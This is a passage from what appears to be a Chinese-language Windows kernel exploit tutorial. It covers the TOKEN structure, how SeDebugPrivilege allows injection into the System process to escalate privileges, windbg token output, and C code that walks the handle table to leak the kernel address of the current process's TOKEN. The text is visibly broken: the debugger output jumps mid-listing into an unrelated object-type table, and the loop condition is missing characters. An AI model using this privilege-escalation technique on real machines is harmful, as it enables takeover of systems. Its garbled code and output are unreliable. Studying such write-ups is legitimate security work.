         ULONG * DynamicPart;
         PACL DefaultDacl;
         TOKEN_TYPE TokenType;
         SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
         ULONG TokenFlags;
         UCHAR TokenInUse;
         ULONG IntegrityLevelIndex;
         ULONG MandatoryPolicy;
         PSECURITY_TOKEN_PROXY_DATA ProxyData;
         PSECURITY_TOKEN_AUDIT_DATA AuditData;
         PSEP_LOGON_SESSION_REFERENCES LogonSession;
         LUID OriginatingLogonSession;
         SID_AND_ATTRIBUTES_HASH SidHash;
         SID_AND_ATTRIBUTES_HASH RestrictedSidHash;
         ULONG VariablePart;
    } TOKEN, *PTOKEN;
这个结构体从Win7开始就没有太多的变动了，这里我们关注一下这几个结构体成员变量:
         SEP_TOKEN_PRIVILEGES Privileges; // 0x40
这个结构体变量用bit位的方式记录了当前token中使用的privilege（特权）。token本质上是一个描述当前安全对象和其他安全对象之间关系的结构体，在Windows中，进程也是一种安全对象。所以TOKEN也描述了当前进程对其他进程的权限。  
当我们使用类似windbg之类的进程对其他各类进程进行调试，这个时候系统就会赋予调试器这个 **调试其他进程的特权** 。特权能够让我们
**往其他更高权限才能够接触到的进程中进行代码注入** ，一个直观的相反就是， **向System进程发起注入** 从而实现进程劫持等等，完成提权。  
我们首先检查一下我们跑EXP的进程使用的`token`是怎么样的
    : kd> !token
    Thread is not impersonating. Using process token...
    _EPROCESS 0xffffffffa25de040, _TOKEN 0x0000000000000000
    TS Session ID: 0x1
    User: S-1-5-21-3717723882-702046769-3252787667-1000
    User Groups: 
     00 S-1-5-21-3717723882-702046769-3252787667-513
        Attributes - Mandatory Default Enabled 
     01 S-1-1-0
        Attributes - Mandatory Default Enabled 
     02 S-1-5-114
        Attributes - Mandatory Default Enabled 
     03 S-1-5-32-544
        Attributes - Mandatory Default Enabled Owner 
     04 S-1-5-32-545
        Attributes - Mandatory Default Enabled 
     05 S-1-5-4
        Attributes - Mandatory Default Enabled 
     06 S-1-2-1
        Attributes - Mandatory Default Enabled 
     07 S-1-5-11
        Attributes - Mandatory Default Enabled 
     08 S-1-5-15
        Attributes - Mandatory Default Enabled 
     09 S-1-5-113
        Attributes - Mandatory Default Enabled 
     10 S-1-5-5-0-252984
        Attributes - Mandatory Default Enabled LogonId 
     11 S-1-2-0
        Attributes - Mandatory Default Enabled 
     12 S-1-5-64-10
        Attributes - Mandatory Default Enabled 
     13 S-1-16-12288
        Attributes - GroupIntegrity GroupIntegrityEnabled 
    Primary Group: S-1-5-21-3717723882-702046769-3252787667-513
    Privs: 
     05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
     08 0x000000008 SeSecurityPrivilege               Attributes - 
     09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
     10 0x00000000a SeLoadDriverPrivilege             Attributes - 
     11 0x00000000b SeSystemProfilePrivilege          Attributes - 
     12 0x00000000c SeSystemtimePrivilege             Attributes - 
     13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - 
     14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - 
     15 0x00000000f SeCreatePagefilePrivilege         Attributes - 
     17 0x000000011 SeBackupPrivilege                 Attributes - 
     18 0x000000012 SeRestorePrivilege                Attributes - 
     19 0x000000013 SeShutdownPrivilege               Attributes - 
     20 0x000000014 SeDebugPrivilege                  Attributes - Enabled  Directory
    5 --> Token
    7 --> Process
    37 --> File
    44 --> Key
于是这里我们就能够通过便利这个句柄表，找到`TOKEN`对象的真正地址：
    for (size_t i = 0; i NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;
        if (buffer->Handels[i].ProcessId == GetCurrentProcessId() && buffer->Handels[i].ObjectTypeNumber == type)
        {
            if (handle == (HANDLE)buffer->Handels[i].Handle)
            {
                //printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
                DWORD object = (DWORD)buffer->Handels[i].Object;
                free(buffer);
                return object;
            }
        }
    }